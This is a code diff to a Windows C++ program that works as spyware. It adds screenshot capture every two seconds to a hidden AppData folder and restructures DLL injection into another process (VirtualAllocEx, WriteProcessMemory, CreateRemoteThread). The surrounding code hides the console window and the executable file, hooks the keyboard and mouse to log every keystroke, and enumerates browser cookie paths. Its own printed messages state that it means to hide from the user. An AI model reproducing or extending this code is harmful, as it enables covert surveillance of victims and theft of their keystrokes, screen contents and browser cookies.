@@ -7,6 +7,10 @@
 #include <locale>
 #include <vector>
 #include <TlHelp32.h>
+#include "lodepng.h" // Include LodePNG header
+#include <ctime>
+#include <gdiplus.h>
+#include <thread>
 
 
 // #include "tcp_connection.h"
@@ -16,6 +20,8 @@ std::ostringstream logStream, keyboardStream;
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
 LRESULT CALLBACK mouseHookProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+
 
 std::wstring GetModuleFileExeName() {
     constexpr size_t MAX_PATH_LEN = 260; // Maximum length of a file path
@@ -331,58 +337,159 @@ void PrintExistedCookiePaths(const std::vector<std::wstring>& cookiePaths) {
         std::wcout << path << std::endl;
     }
 }
+std::wstring GetValidFileName(const std::wstring& fileName) {
+    // Replace invalid characters with underscores
+    std::wstring validFileName;
+    for (wchar_t ch : fileName) {
+        if (ch == L'<' || ch == L'>' || ch == L':' || ch == L'"' || ch == L'/' || ch == L'\\' || ch == L'|' || ch == L'?' || ch == L'*') {
+            validFileName += L'_';
+        }
+        else {
+            validFileName += ch;
+        }
+    }
+    return validFileName;
+}
 
-int main()
-{
+void SaveScreenShotAsPNG(const std::wstring& filePath, HBITMAP hBitmap, int width, int height) {
+    // Encode BMP data as PNG
+    std::vector<unsigned char> pngData;
+    std::vector<unsigned char> bmpData(width * height * 4); // Allocate buffer for BMP data
+    BITMAPINFOHEADER bi{};
+    bi.biSize = sizeof(BITMAPINFOHEADER);
+    bi.biWidth = width;
+    bi.biHeight = -height; // Top-down bitmap
+    bi.biPlanes = 1;
+    bi.biBitCount = 32; // 32 bits per pixel (RGBA)
+    bi.biCompression = BI_RGB;
+    bi.biSizeImage = 0;
+    bi.biXPelsPerMeter = 0;
+    bi.biYPelsPerMeter = 0;
+    bi.biClrUsed = 0;
+    bi.biClrImportant = 0;
+    HDC hdc = GetDC(NULL);
+    GetDIBits(hdc, hBitmap, 0, height, bmpData.data(), (BITMAPINFO*)&bi, DIB_RGB_COLORS);
 
-    // Get the cookie paths
-    std::vector<std::wstring> cookiePaths = GetCookiePaths();
+    unsigned error = lodepng::encode(pngData, bmpData, width, height);
+    if (error) {
+        std::wcerr << L"PNG encoding error: " << lodepng_error_text(error) << std::endl;
+        return;
+    }
 
-    // Print the cookie paths
-    PrintExistedCookiePaths(cookiePaths);
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name to save PNG files." << std::endl;
+    }
 
-    SetConsoleTitleA("Anime Girl");
-    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    // Construct full file path for PNG
+    std::wstring fullFilePath = L"C:\\Users\\" + std::wstring(userName) + L"\\AppData\\Roaming\\screenshot\\" + filePath;
+    
+    // Write PNG data to file
+    std::ofstream pngFile(fullFilePath, std::ios::binary);
+    if (!pngFile.is_open()) {
+        std::wcerr << L"Failed to open PNG file for writing: " << fullFilePath << std::endl;
+        return;
+    }
+    pngFile.write(reinterpret_cast<const char*>(pngData.data()), pngData.size());
+
+    std::wcout << L"PNG file saved: " << fullFilePath << std::endl;
+}
+
+
+void GetScreenShot(const std::wstring& userName) {
+    int x1, y1, x2, y2, w, h;
+
+    // get screen dimensions
+    x1 = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    y1 = GetSystemMetrics(SM_YVIRTUALSCREEN);
+    x2 = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    y2 = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    w = x2 - x1;
+    h = y2 - y1;
+
+    // copy screen to bitmap
+    HDC     hScreen = GetDC(NULL);
+    HDC     hDC = CreateCompatibleDC(hScreen);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
+    HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
+    BOOL    bRet = BitBlt(hDC, 0, 0, w, h, hScreen, x1, y1, SRCCOPY);
+
+    // Construct full file path for PNG
+    std::time_t now = std::time(nullptr);
+    std::tm timeinfo;
+    localtime_s(&timeinfo, &now);
+    wchar_t buffer[256]; // It can be get smaller
+    wcsftime(buffer, sizeof(buffer), L"%Y-%m-%d_%H-%M-%S", &timeinfo);
+    std::wstring filename = GetValidFileName(userName) + L"_" + std::wstring(buffer);
+    std::wstring pngFilePath = filename + L".png";
+
+    // Save screenshot as PNG
+    SaveScreenShotAsPNG(pngFilePath, hBitmap, w, h);
+
+    // clean up
+    SelectObject(hDC, old_obj);
+    DeleteDC(hDC);
+    ReleaseDC(NULL, hScreen);
+    DeleteObject(hBitmap);
+}
+
+bool DllPartOfFunctions() {
+
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return false;
+    }
 
     std::wstring desiredPath = L"dl.dll";
     std::wstring dllPath = CreateOrGetDLLPath(desiredPath);
 
     if (dllPath.empty()) {
         std::cerr << "Failed to get DLL path." << std::endl;
-        return 1;
+        return false;
     }
 
     std::wcout << "DLL path: " << dllPath << std::endl;
 
     std::wstring targetProcName = GetModuleFileExeName();
     if (targetProcName.empty()) {
-        return 1;
+        return false;
     }
 
-    DWORD procId = GetProcIdByName(targetProcName.c_str());    
+    DWORD procId = GetProcIdByName(targetProcName.c_str());
     if (procId == 0) {
         std::cerr << "Failed to get target process ID." << std::endl;
-        return 1;
+        return false;
+    }
+
+    // Set file attributes
+    if (!SetFileAttributesW(targetProcName.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
+        std::cerr << "Failed to set file attributes. Error: " << GetLastError() << std::endl;
+        return false;
     }
 
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procId);
     if (hProc == NULL) {
         std::cerr << "Failed to open target process. Error: " << GetLastError() << std::endl;
-        return 1;
+        return false;
     }
 
     LPVOID remoteMem = VirtualAllocEx(hProc, nullptr, dllPath.size() * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (remoteMem == NULL) {
         std::cerr << "Failed to allocate remote memory. Error: " << GetLastError() << std::endl;
         CloseHandle(hProc);
-        return 1;
+        return false;
     }
 
     if (!WriteProcessMemory(hProc, remoteMem, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), nullptr)) {
         std::cerr << "Failed to write DLL path to remote process. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
         CloseHandle(hProc);
-        return 1;
+        return false;
     }
 
     HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
@@ -390,7 +497,7 @@ int main()
         std::cerr << "Failed to get handle to kernel32.dll. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
         CloseHandle(hProc);
-        return 1;
+        return false;
     }
 
     LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryW");
@@ -398,7 +505,7 @@ int main()
         std::cerr << "Failed to get address of LoadLibraryW. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
         CloseHandle(hProc);
-        return 1;
+        return false;
     }
 
     HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, loadLibraryAddr, remoteMem, 0, NULL);
@@ -406,7 +513,7 @@ int main()
         std::cerr << "Failed to create remote thread. Error: " << GetLastError() << std::endl;
         VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
         CloseHandle(hProc);
-        return 1;
+        return false;
     }
 
     WaitForSingleObject(hThread, INFINITE);
@@ -415,19 +522,74 @@ int main()
     CloseHandle(hThread);
     VirtualFreeEx(hProc, remoteMem, 0, MEM_RELEASE);
     CloseHandle(hProc);
+    return true;
+}
 
-    // Set file attributes
-    if (!SetFileAttributesW(targetProcName.c_str(), FILE_ATTRIBUTE_HIDDEN)) {
-        std::cerr << "Failed to set file attributes. Error: " << GetLastError() << std::endl;
-        //return 1;
+void ScreenCaptureThread(const wchar_t* userName)
+{
+    while (true) {
+        GetScreenShot(userName);
+        std::this_thread::sleep_for(std::chrono::seconds(2)); // Wait for 5 minutes
+    }
+}
+
+void CreateScreenshotFolder(const std::wstring& userName) {
+    // Construct the full path for the screenshot folder
+    std::wstring folderPath = L"C:\\Users\\" + userName + L"\\AppData\\Roaming\\screenshot";
+
+    // Attempt to create the directory
+    if (!CreateDirectory(folderPath.c_str(), NULL)) {
+        DWORD error = GetLastError();
+        if (error == ERROR_ALREADY_EXISTS) {
+            // If the folder already exists, inform the user
+            std::wcout << "The screenshot folder already exists." << std::endl;
+        }
+        else {
+            // If there was an error creating the folder, provide details about the error
+            std::wcerr << "Failed to create the screenshot folder. Error code: " << error << std::endl;
+        }
+    }
+    else {
+        // If the folder was successfully created, notify the user
+        std::wcout << "The screenshot folder was created successfully." << std::endl;
+    }
+}
+
+
+int main()
+{
+    // Get the user's name
+    wchar_t userName[MAX_PATH];
+    DWORD userNameSize = sizeof(userName) / sizeof(userName[0]);
+    if (!GetUserNameW(userName, &userNameSize)) {
+        std::cerr << "Failed to retrieve user name." << std::endl;
+        return 1;
+    
     }
 
-    logFile.open("log.csv", std::ios::app);
-    logStream << "Time,Event,Type,Key/Position,MousePosition\n";
-    logFile << logStream.str();
+    CreateScreenshotFolder(userName);
+
+    // Create a thread for capturing screenshots
+    std::thread captureThread(ScreenCaptureThread, userName);
+
+    // Perform other tasks in the main thread
+    if (!DllPartOfFunctions()) {
+        std::cerr << "Failed when program created a DLL file.";
+        return 1;
+    }
+
+    // Get the cookie paths
+    std::vector<std::wstring> cookiePaths = GetCookiePaths();
+
+    // Print the cookie paths
+    PrintExistedCookiePaths(cookiePaths);
+
+    // Initialize logging
+    std::ofstream logFile("log.csv", std::ios::app);
+    logFile << "Time,Event,Type,Key/Position,MousePosition\n";
     logFile.close();
 
-    keyboardFile.open("linear_keyboard.txt", std::ios::app);
+    std::ofstream keyboardFile("linear_keyboard.txt", std::ios::app);
     keyboardFile << "Every word typed by computer:\n";
     keyboardFile.close();
 
@@ -437,14 +599,17 @@ int main()
     MSG message;
     std::cout << "I am working now\nBut you don't need to look at terminal for real" << std::endl;
     std::cout << "If I had chance to do, I will hide that too" << std::endl;
-    while (GetMessage(&message, NULL, 0, 0))
-    {
+    while (GetMessage(&message, NULL, 0, 0)) {
         TranslateMessage(&message);
         DispatchMessage(&message);
     }
 
     UnhookWindowsHookEx(keyboardHook);
     UnhookWindowsHookEx(mouseHook);
+
+    // Wait for the capture thread to finish (should not happen in this scenario)
+    captureThread.join();
+
     return 0;
 }
 
